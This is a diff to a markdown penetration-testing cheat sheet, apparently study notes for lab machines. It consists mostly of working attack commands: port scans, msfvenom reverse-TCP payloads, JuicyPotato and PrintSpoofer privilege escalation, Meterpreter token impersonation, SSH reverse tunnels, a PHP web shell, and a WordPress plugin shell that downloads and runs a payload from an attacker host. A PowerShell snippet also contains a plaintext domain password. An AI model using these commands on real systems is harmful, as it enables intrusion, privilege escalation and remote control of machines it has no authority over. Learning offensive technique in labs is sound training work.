@@ -101,6 +101,18 @@ Sweep for hosts with an open port 445 on the /24 subnet
 for i in $(seq 1 254); do nc -zv -w 1 172.16.50.$i 445; done
 ```
 
+`portscan.sh`
+
+```bash
+#!/bin/bash
+host=10.5.5.11
+for port in {1..65535}; do
+    timeout .1 bash -c "echo >/dev/tcp/$host/$port" &&
+        echo "port $port is open"
+done
+echo "Done"
+```
+
 Checks if an IP responds to ICMP and whether a specified TCP port is open
 
 ```pwsh
@@ -111,6 +123,12 @@ Scan the first 1024 ports on the Domain Controller
 
 ```pwsh
 1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("192.168.50.151", $_)) "TCP port $_ is open"} 2>$null
+```
+
+Ping sweep
+
+```bat
+for /L %i in (1,1,255) do @ping -n 1 -w 200 10.5.5.%i > nul && echo 10.5.5.%i is up.
 ```
 
 ## Port Scanning with Nmap
@@ -370,8 +388,11 @@ dirb http://www.megacorpone.com -r -z 10
 nikto -host=http://www.megacorpone.com -maxtime=30s
 ```
 
+(--enumerate) to include "All Plugins" (ap), "All Themes" (at), "Config backups" (cb), and "Db exports" (dbe). 
+
 ```bash
 wpscan --url http://192.168.50.244 --enumerate p --plugins-detection aggressive -o websrv1/wpscan
+wpscan --url sandbox.local --enumerate ap,at,cb,dbe
 ```
 
 ## Enumerating and Abusing APIs
@@ -559,18 +580,6 @@ $EncodedText
 curl http://192.168.50.189/uploads/simple-backdoor.pHP?cmd=powershell%20-enc%20<$EncodedText>
 ```
 
-Create an SSH keypair
-
-```bash
-ssh-keygen
-```
-
-Insert the previously created public key into `authorized_keys` file 
-
-```bash
-cat filename.pub > authorized_keys
-```
-
 ## Command Injection Vulnerabilities
 
 Determine if our commands are executed by PowerShell or CMD
@@ -583,6 +592,10 @@ Determine if our commands are executed by PowerShell or CMD
 
 ```bash
 mysql -u root -p'root' -h 192.168.50.16 -P 3306
+```
+
+```bash
+mysql --host=127.0.0.1 --port=13306 --user=wp -p
 ```
 
 **impacket**
@@ -666,6 +679,8 @@ sqlmap -r wp.req -p 'question_id' -D wordpress -T wp_users --dump --technique=T 
 select version();
 select system_user();
 show databases;
+SHOW Grants;
+show variables;
 ```
 
 ### SQL Server
@@ -815,7 +830,7 @@ John
 ```
 
 ```bash
-sudo swaks -t daniela@beyond.com -t marcus@beyond.com --from john@beyond.com --attach @config.Library-ms --server 192.168.50.242 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap
+swaks -t daniela@beyond.com -t marcus@beyond.com --from john@beyond.com --attach @config.Library-ms --server 192.168.50.242 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap
 ```
 
 ## HTML Application
@@ -877,7 +892,7 @@ nmap --script-help=clamav-exec.nse
 Browse to http://127.0.0.1:3000/ui/panel using the default credentials beef/beef to log in
 
 ```bash
-sudo beef-xss
+beef-xss
 ```
 
 ## Fixing Exploits
@@ -912,6 +927,12 @@ VirusTotal, **AntiScan.Me**
 
 ```bash
 xxd -b malware.txt
+```
+
+-p flag outputs a plain hexdump
+
+```bash
+xxd -p lib_mysqludf_sys.so | tr -d '\n' > lib_mysqludf_sys.so.hex
 ```
 
 ## On-disk evasion
@@ -990,6 +1011,12 @@ sudo apt install shellter
 
 sudo apt install wine
 dpkg --add-architecture i386 && apt-get update && apt-get install wine32
+```
+
+Custom (C) payload we generated with msfvenom for shellter
+
+```bash
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.0.4 LPORT=80 -e x86/shikata_ga_nai -i 7 -f raw > met.bin
 ```
 
 # Password Attacks
@@ -1488,6 +1515,9 @@ reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer
 windows-privesc-check2.exe --dump -G
 ```
 
+Check Alex's mailbox: `C:\Users\alex\AppData\Roaming\Thunderbird\Profiles\jbv4ndsh.default-release\Mail\mail.sandbox.local\Inbox`
+
+
 ## Hidden in Plain View
 
 ```pwsh
@@ -1598,6 +1628,8 @@ net stop mysql
 Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}
 
 wmic service where caption="Serviio" get name, caption, state, startmode
+
+wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows"
 ```
 
 Get a list of all privileges, The **Disabled** state only indicates if the privilege is currently enabled for the running process
@@ -1792,7 +1824,7 @@ To abuse this, we need to find a privileged process and coerce it into connectin
 
 **PrintSpoofer** tool implements a variation of the printer bug to coerce `NT AUTHORITY\SYSTEM` into connecting to a controlled named pipe. Where we have code execution as a user with the privilege **SeImpersonatePrivilege** to execute commands or obtain an interactive shell as NT AUTHORITY\SYSTEM.
 
-Other tools that can abuse SeImpersonatePrivilege for privilege escalation: Variants from the **Potato** family (e.g., RottenPotato, SweetPotato, or JuicyPotato).
+Other tools that can abuse SeImpersonatePrivilege for privilege escalation: Variants from the **Potato** family (e.g., RottenPotato, SweetPotato, or JuicyPotato (https://github.com/ohpe/juicy-potato)).
 
 ```bash
 wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
@@ -1800,6 +1832,15 @@ wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64
 
 ```pwsh
 .\PrintSpoofer64.exe -i -c powershell.exe
+```
+
+3 mandatory arguments: -t, -p, and -l.
+* -t: is the "Process creation mode". The documentation states that we need CreateProcessWithToken if we have the SeImpersonate privilege. To direct Juicy Potato to use CreateProcessWithToken, we will pass the t value.
+* -p: specifies the program we are trying to run.
+* -l: specify an arbitrary port for the COM server to listen on
+
+```bat
+JuicyPotato.exe -t t -p C:\Users\Public\whoami.exe -l 5837
 ```
 
 # Linux Privilege Escalation
@@ -1826,6 +1867,7 @@ hostname
 
 cat /etc/issue
 cat /etc/os-release
+cat /proc/version
 
 uname -a
 
@@ -2071,6 +2113,8 @@ ssh -N -L 0.0.0.0:4455:172.16.50.217:445 database_admin@10.4.50.215
 
 By default, Proxychains is configured with very **high time-out values**. Lowering the **tcp_read_time_out** and **tcp_connect_time_out** values in the Proxychains configuration file will force Proxychains to time-out on non-responsive connections more quickly. => speed up port-scanning times.
 
+ICMP host discovery will not work through the proxychains tunnel
+
 SSH **dynamic port forward** as part of our SSH connection from CONFLUENCE to 10.4.50.215
 - listen on all interfaces on port 9999 on CONFLUENCE (0.0.0.0:9999)
 - update `/etc/proxychains4.conf`: `socks5 <CONFLUENCE's IP> 9999`
@@ -2097,6 +2141,12 @@ SSH **remote port forward** as part of our SSH connection from CONFLUENCE to Kal
 
 ```bash
 ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4
+```
+
+-N flag to specify that we are not running any commands. -f option to request ssh to go to the background.
+
+```bash
+ssh -f -N -R 1122:10.5.5.11:22 -R 13306:10.5.5.11:3306 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i /tmp/keys/id_rsa kali@10.11.0.4
 ```
 
 SSH **remote dynamic port forward** as part of our SSH connection from CONFLUENCE to Kali,
@@ -2566,7 +2616,7 @@ run -j
 Update our proxychains configuration file (`/etc/proxychains4.conf`) to take advantage of the SOCKS5 proxy: `socks5 127.0.0.1 1080`
 
 ```bash
-sudo proxychains xfreerdp /v:172.16.5.200 /u:luiza
+proxychains xfreerdp /v:172.16.5.200 /u:luiza /d:sandbox
 ```
 
 ### Meterpreter Command
@@ -2586,6 +2636,14 @@ help
 creds_msv
 ```
 
+List the tokens
+
+```
+use incognito
+list_tokens -u
+impersonate_token sandbox\\Administrator
+```
+
 Create a port forward from localhost port 3389 to port 3389 on the target host (172.16.5.200)
 
 ```
@@ -2594,7 +2652,7 @@ portfwd add -l 3389 -p 3389 -r 172.16.5.200
 ```
 
 ```bash
-sudo xfreerdp /v:127.0.0.1 /u:luiza
+xfreerdp /v:127.0.0.1 /u:luiza
 ```
 
 ## Resource Scripts
@@ -2887,6 +2945,14 @@ Decrypts a given GPP encrypted string
 gpp-decrypt "+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"
 ```
 
+Discover the domain controller's hostname 
+
+```
+nslookup
+set type=all
+_ldap._tcp.dc._msdcs.sandbox.local
+```
+
 ## Active Directory - Automated Enumeration
 
 ```pwsh
@@ -3119,7 +3185,7 @@ hashcat --help | grep -i "Kerberos"
 ```
 
 ```bash
-sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
 ```
 
 To identify users with the enabled AD user account option **Do not require Kerberos preauthentication**, use PowerView's `Get-DomainUser` function with the option `-PreauthNotRequired` on Windows.
@@ -3157,7 +3223,7 @@ sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete
 ```
 
 ```bash
-sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
 ```
 
 Request the service ticket (the registered SPN for the IIS web server in the domain is HTTP/CorpWebServer.corp.com)
@@ -3328,6 +3394,11 @@ $credential = New-Object System.Management.Automation.PSCredential $username, $s
 New-PSSession -ComputerName 192.168.50.73 -Credential $credential
 
 Enter-PSSession 1
+```
+
+```pwsh
+$dcsesh = New-PSSession -Computer SANDBOXDC
+Invoke-Command -Session $dcsesh -ScriptBlock {ipconfig}
 ```
 
 ## SysInternals PsExec
@@ -3561,7 +3632,16 @@ nc -nvlp 4444
 ```
 
 ```bash
-msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST 192.168.50.1;set LPORT 443;run;"
+msfconsole -q -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST 192.168.50.1;set LPORT 443;run"
+```
+
+```bash
+sudo msfconsole -q -x "use exploit/multi/handler;\
+                          set PAYLOAD windows/meterpreter/reverse_tcp;\
+                          set AutoRunScript post/windows/manage/migrate;\
+                          set LHOST 10.11.0.4;\
+                          set LPORT 80;\
+                          run"
 ```
 
 ## PowerShell
@@ -3833,6 +3913,11 @@ sudo atftpd --daemon --port 69 /tftp
 tftp -i 10.11.0.4 put important.docx
 ```
 
+```pwsh
+$dcsesh = New-PSSession -Computer SANDBOXDC
+Copy-Item "C:\Users\Public\whoami.exe" -Destination "C:\Users\Public\" -ToSession $dcsesh
+```
+
 # Linux Miscellaneous
 
 ```bash
@@ -3969,6 +4054,24 @@ return_me
 echo "The previous function returned a value of $?"
 ```
 
+Create an SSH keypair
+
+```bash
+ssh-keygen
+```
+
+Insert the previously created public key into `authorized_keys` file 
+
+```bash
+cat filename.pub > authorized_keys
+```
+
+Ignore any commands the user supplies with the command option in ssh. Prevent agent and X11 forwarding with the no-agent-forwarding and no-X11-forwarding options. Prevent the user from being allocated a tty device with the no-tty option. To allows the owner of the private key, to log in to our Kali machine but prevents them from running commands and only allows for port forwarding
+
+```
+from="10.11.1.250",command="echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-X11-forwarding,no-pty ssh-rsa AAAAB3NzaC1yc2EAAAADA/IPHxsPg+fflPKW4N6pK0ZXS/ENC68Py+NhtW1c2So95ARwCa/H/d02iOWCLGEav2V1R9xk87xV/US2LoqHxs7OxNq61BLtr4I/MDnin www-data@ajla
+```
+
 # Windows Miscellaneous
 
 ```pwsh
@@ -3993,6 +4096,26 @@ Import-Module NtObjectManager
 Get-NtTokenIntegrityLevel
 ```
 
+```pwsh
+# find a better way to automate this
+$username = "sandbox\alex"
+$pwdTxt = "Ndawc*nRoqkC+haZ"
+$securePwd = $pwdTxt | ConvertTo-SecureString 
+$credObject = New-Object System.Management.Automation.PSCredential -ArgumentList $username, $securePwd
+
+# Enable remote management on Poultry
+$remoteKeyParams = @{
+ComputerName = "POULTRY"
+Path = 'HKLM:\SOFTWARE\Microsoft\WebManagement\Server'
+Name = 'EnableRemoteManagement'
+Value = '1'
+}
+Set-RemoteRegistryValue @remoteKeyParams -Credential $credObject
+
+# Strange calc processes running lately
+Stop-Process -processname calc
+```
+
 # Miscellaneous
 
 PHP Web Shell
@@ -4003,6 +4126,25 @@ PHP Web Shell
 
 ```php
 <?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>
+```
+
+Add new Wordpress web shell plugin
+
+```bash
+cd /usr/share/seclists/Web-Shells/WordPress/
+zip plugin-shell.zip plugin-shell.php
+
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.11.0.4 LPORT=443 -f elf > shell.elf
+
+curl http://sandbox.local/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=wget%20http://10.11.0.4/shell.elf
+curl http://sandbox.local/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=chmod%20%2bx%20shell.elf
+curl http://sandbox.local/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=./shell.elf
+```
+
+find the database configuration for WordPress
+
+```bash
+cat wp-config.php
 ```
 
 ```bash
